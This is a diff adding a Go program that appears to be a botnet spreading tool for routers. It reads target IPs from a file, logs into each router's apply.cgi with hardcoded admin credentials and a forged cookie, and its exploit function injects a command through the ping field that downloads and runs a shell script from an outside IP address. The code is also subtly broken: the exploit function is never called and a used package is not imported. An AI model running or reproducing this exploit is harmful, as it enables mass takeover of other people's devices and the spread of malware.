@@ -1,0 +1,144 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+	"crypto/tls"
+)
+
+func SendLogin(ip string, port string) {
+	// Disable SSL certificate validation
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr}
+
+	// Prepare the login data
+	loginURL := fmt.Sprintf("https://%s:%s/apply.cgi", ip, port)
+	loginData := url.Values{
+		"submit_button":   {"login"},
+		"submit_type":     {"do_login"},
+		"change_action":   {"gozila_cgi"},
+		"username":        {"admin"},
+		"passwd":          {"64864aef3005433208d8410461768dcb"},
+	}
+
+	// Send the login request
+	req, err := http.NewRequest("POST", loginURL, strings.NewReader(loginData.Encode()))
+	if err != nil {
+		fmt.Printf("Failed to create login request for IP %s: %v\n", ip, err)
+		return
+	}
+
+	// Set request headers
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Cookie", "kz_userid=admin:230785")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36")
+	req.Header.Set("Referer", fmt.Sprintf("https://%s:%s/login.asp", ip, port))
+
+	// Perform the login request
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Printf("Failed to send login request for IP %s: %v\n", ip, err)
+		return
+	}
+	defer resp.Body.Close()
+
+	// Check the response
+	if resp.StatusCode == http.StatusOK {
+		fmt.Printf("Login successful for IP %s!\n", ip)
+	} else {
+		fmt.Printf("Login failed for IP %s. Response status: %s\n", ip, resp.Status)
+	}
+}
+
+func SendExploit(ip string, port string) {
+	// Disable SSL certificate validation
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr}
+
+	// Prepare the exploit data
+	exploitURL := fmt.Sprintf("https://%s:%s/apply.cgi", ip, port)
+	exploitData := url.Values{
+		"submit_button": {"ping_test"},
+		"submit_type":   {"do_ping"},
+		"change_action": {"gozila_cgi"},
+		"pingAddr":      {"|wget -O- http://45.88.67.38/lte.sh|sh|"},
+		"web_net_mode":  {"ipv4"},
+	}
+
+	// Send the exploit request
+	req, err := http.NewRequest("POST", exploitURL, strings.NewReader(exploitData.Encode()))
+	if err != nil {
+		fmt.Printf("Failed to create exploit request for IP %s: %v\n", ip, err)
+		return
+	}
+
+	// Set request headers
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Cookie", "kz_userid=admin:179018")
+	req.Header.Set("Sec-Ch-Ua", "")
+	req.Header.Set("Accept", "*/*")
+	req.Header.Set("X-Requested-With", "XMLHttpRequest")
+	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36")
+	req.Header.Set("Sec-Ch-Ua-Platform", "\"\"")
+	req.Header.Set("Origin", fmt.Sprintf("https://%s:%s", ip, port))
+	req.Header.Set("Sec-Fetch-Site", "same-origin")
+	req.Header.Set("Sec-Fetch-Mode", "cors")
+	req.Header.Set("Sec-Fetch-Dest", "empty")
+	req.Header.Set("Referer", fmt.Sprintf("https://%s:%s/ping.asp", ip, port))
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Connection", "close")
+
+	// Perform the exploit request
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Printf("Failed to send exploit request for IP %s: %v\n", ip, err)
+		return
+	}
+	defer resp.Body.Close()
+
+	// Read the response body
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Printf("Failed to read response body for IP %s: %v\n", ip, err)
+		return
+	}
+	fmt.Printf("Response body for IP %s (exploit): %s\n", ip, string(body))
+}
+
+
+func main() {
+	if len(os.Args) < 2 {
+		fmt.Println("Usage: go run main.go <port>")
+		return
+	}
+
+	port := os.Args[1]
+
+	file, err := os.Open("ips.txt")
+	if err != nil {
+		fmt.Println("Failed to open ips.txt:", err)
+		return
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		ip := strings.TrimSpace(scanner.Text())
+		SendLogin(ip, port)
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Failed to read ips.txt:", err)
+		return
+	}
+}
